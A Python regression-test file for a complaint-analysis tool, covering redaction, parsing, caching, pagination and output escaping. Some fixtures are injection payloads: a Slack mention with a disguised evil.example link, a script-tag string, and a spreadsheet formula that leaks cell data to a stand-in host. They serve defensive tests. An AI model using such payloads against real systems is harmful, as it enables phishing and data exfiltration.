"""Regression tests for bugs found in an independent review. Each test is the
reviewer's reproduction, so the bug cannot quietly come back."""

import csv
import json
from datetime import date
from types import SimpleNamespace

import anthropic

from radar import analyze, brief, classify, cli, ingest, labels, watch
from radar.connectors import intercom
from radar.connectors.privacy import redact
from radar.models import Complaint

TODAY = date(2026, 11, 22)


def _c(i, text, d=date(2026, 11, 2), rating=1, **kw):
    return Complaint(id=f"r:{i}", source="t", text=text, date=d, rating=rating, company_replied=False, **kw)


# 1 ------------------------------------------------------------- name leak (privacy)
def test_next_reviewers_name_never_ends_up_in_previous_body():
    raw = ("John Smith\nGB\nRated 1 out of 5 stars\nNov 12, 2026\nWithdrawal stuck\n"
           "My withdrawal has been pending for 9 days.\nJane Doe\nUS\nRated 2 out of 5 stars\nNov 13, 2026\nT2\nBody two.")
    a, b = ingest.parse_trustpilot_paste(raw, TODAY)
    assert "Jane" not in a.text and a.text == "My withdrawal has been pending for 9 days."
    assert b.text == "Body two." and b.author_hash and a.author_hash != b.author_hash


# 2 --------------------------------------------------- webhook mentions / disguised links
def test_alert_payload_cannot_ping_or_disguise_links():
    evil = '<!channel> withdraw now at <https://evil.example|metawin.com/support> & @everyone'
    slack = watch.payload_for("https://hooks.slack.com/services/x", evil)["text"]
    assert "<" not in slack and ">" not in slack and "&lt;!channel&gt;" in slack and "&amp;" in slack
    discord = watch.payload_for("https://discord.com/api/webhooks/1/x", evil)
    assert discord["allowed_mentions"] == {"parse": []}


# 3 ---------------------------------------------------- phone at end of sentence
def test_phone_numbers_redacted_before_full_stop():
    assert redact("call me on 07700 900123.") == "call me on [phone]."
    assert redact("my number is +44 7700 900123.") == "my number is [phone]."
    assert redact("sent 0.00012345 ETH on 2026-11-02.") == "sent 0.00012345 ETH on 2026-11-02."


# 4 --------------------------------------------- label page broken by one review
def test_label_page_json_has_no_raw_angle_brackets():
    items = classify.classify_rules([_c(1, "<!--<script> my lossback was never credited")])
    page = labels.render_label_page(items)
    script = page[page.index("const D="):]
    assert "<!--" not in script and "<script>" not in script.split("</script>")[0]
    data = script[len("const D="):script.index(";\n")]
    assert json.loads(data)["rows"][0]["text"].startswith("<!--<script>")  # still round-trips for display


# 5 ------------------------------------------------ brief stated the wrong count
def test_merged_promo_count_is_within_the_top_category():
    items = [_c(i, f"withdrawal pending for days {i}" + (" lossback" if i < 7 else "")) for i in range(10)]
    items += [_c(f"k{i}", f"kyc demands again lossback {i}") for i in range(3)]
    rep = analyze.analyze(classify.classify_rules(items))
    top = brief.find(rep)[0]
    assert top.key == "top_category"
    assert top.detail == "10 of 13 negative reviews. Lossback alone is named in 7 of them."  # was "10 of them"


# 6 ------------------------------------------------------ percentage above 100%
def test_bot_share_never_exceeds_100_percent():
    items = classify.classify_rules([_c(i, f"my deposit never arrived, the live chat is just a bot {i}") for i in range(6)])
    for c in items:
        c.labels = [c.category]  # as the Claude path can produce: bot mention without a support label
    rep = analyze.analyze(items)
    bot = next(f for f in brief.find(rep) if f.key == "bot_support")
    pcts = [int(x) for x in __import__("re").findall(r"(\d+)%", bot.detail)]
    assert pcts and max(pcts) <= 100


# 7 ------------------------------------------------- invalid / day-first dates
def test_bad_dates_become_undated_and_day_first_files_are_detected(tmp_path):
    assert ingest.parse_date("Nov 31, 2026") is None
    p = tmp_path / "d.csv"
    p.write_text("date,text,rating\n13/11/2026,deposit missing,1\n05/11/2026,withdrawal stuck,1\n32/13/2026,broken date,1\n")
    a, b, c = ingest.load(p)
    assert (a.date, b.date, c.date) == (date(2026, 11, 13), date(2026, 11, 5), None)
    assert cli.main(["report", str(p), "-o", str(tmp_path / "out" / "r.html")]) == 0


# 8 --------------------------------------------------- decimal ratings in CSV
def test_decimal_ratings_parse(tmp_path):
    p = tmp_path / "r.csv"
    p.write_text("date,text,rating\n2026-11-01,Great site love it,5.0\n2026-11-01,meh,4.5\n2026-11-01,bad,abc\n")
    a, b, c = ingest.load(p)
    assert (a.rating, a.is_negative, b.rating, c.rating) == (5, False, 4, None)


# 9 ------------------------------------------------- pagination infinite loop
def test_intercom_search_stops_on_repeated_cursor(monkeypatch):
    calls = []

    def fake_request(method, url, **kw):
        calls.append(url)
        return {"conversations": [{"id": "1"}, {"id": "2"}], "pages": {"next": {"starting_after": "CUR"}}}

    monkeypatch.setattr(intercom, "request_json", fake_request)
    ids = list(intercom._search_ids("http://x", {}, date(2026, 1, 1), None, 5000, lambda m: None))
    assert ids == ["1", "2"] and len(calls) <= 2


# 10 ------------------------------------------- stale cache / bad ids / honest count
def test_claude_cache_rejects_stale_categories_and_negative_ids(monkeypatch, tmp_path):
    items = [_c(i, f"text {i} withdrawal pending for days") for i in range(3)]
    cache = tmp_path / "c.json"
    cache.write_text(json.dumps({classify._cache_key(items[0]): {"category": "bonus_abuse", "other_categories": [], "promos": [],
                                                                 "severity": 1, "needs_human": False, "mentions_bot_support": False,
                                                                 "summary": "x"}}))

    def create(**kw):
        payload = json.loads(kw["messages"][0]["content"].split("\n", 1)[1])
        res = [{"id": "-1", "category": "fairness", "other_categories": [], "promos": [], "severity": 1,
                "needs_human": False, "mentions_bot_support": False, "summary": "bogus"}]
        assert len(payload) == 2  # item 0 was cached (stale), so it isn't re-sent
        return SimpleNamespace(stop_reason="end_turn", content=[SimpleNamespace(type="text", text=json.dumps({"results": res}))])

    monkeypatch.setattr(anthropic, "Anthropic", lambda: SimpleNamespace(beta=SimpleNamespace(messages=SimpleNamespace(create=create))))
    out = classify.classify_with_claude(items, cache_path=cache)
    assert [c.classified_by for c in out] == ["rules"] * 3  # stale cache ignored, "-1" not applied
    analyze.analyze(out)  # must not crash on a category that no longer exists


def test_cache_key_changes_with_the_prompt(monkeypatch):
    c = _c(1, "x")
    k1 = classify._cache_key(c)
    monkeypatch.setattr(classify, "_PROMPT_VERSION", "changed")
    assert classify._cache_key(c) != k1


# 11 ---------------------------------------- duplicates across days of pasting
def test_same_paste_on_different_days_dedupes():
    raw = "Pat Q\nUS\n2 reviews\nRated 1 out of 5 stars\n2 days ago\nStuck\nMy withdrawal is stuck.\nUseful"
    a = ingest.parse_trustpilot_paste(raw, date(2026, 11, 20))
    b = ingest.parse_trustpilot_paste(raw, date(2026, 11, 21))
    assert a[0].id == b[0].id and len(ingest.dedupe(a + b)) == 1


# 12 ------------------------------------------------ spreadsheet formula injection
def test_csv_export_neutralises_formulas(tmp_path):
    item = classify.classify_rules([_c(1, '=HYPERLINK("https://evil.example/?"&A1,"Click for refund")')])
    path = tmp_path / "x.csv"
    cli.write_csv(item, path)
    row = next(csv.DictReader(path.open()))
    assert row["text"].startswith("'=")
    assert row["id"] == "r:1"  # ids are untouched, so the file still works as labels


# minor --------------------------------------------- weekday-independent cutoff
def test_watch_window_is_two_calendar_weeks_on_any_weekday():
    items = [_c(f"b{w}", "withdrawal pending for days", d=date(2026, 10, 5) + __import__("datetime").timedelta(weeks=w)) for w in range(5)]
    items += [_c(f"s{n}", f"lossback never credited {n}", d=date(2026, 11, 9)) for n in range(6)]
    rep = analyze.analyze(classify.classify_rules(items))
    assert watch.pending_alerts(rep, {}, as_of=date(2026, 11, 22))  # Sunday: week of 9 Nov is last week
    assert not watch.pending_alerts(rep, {}, as_of=date(2026, 11, 23))  # Monday: now two weeks back
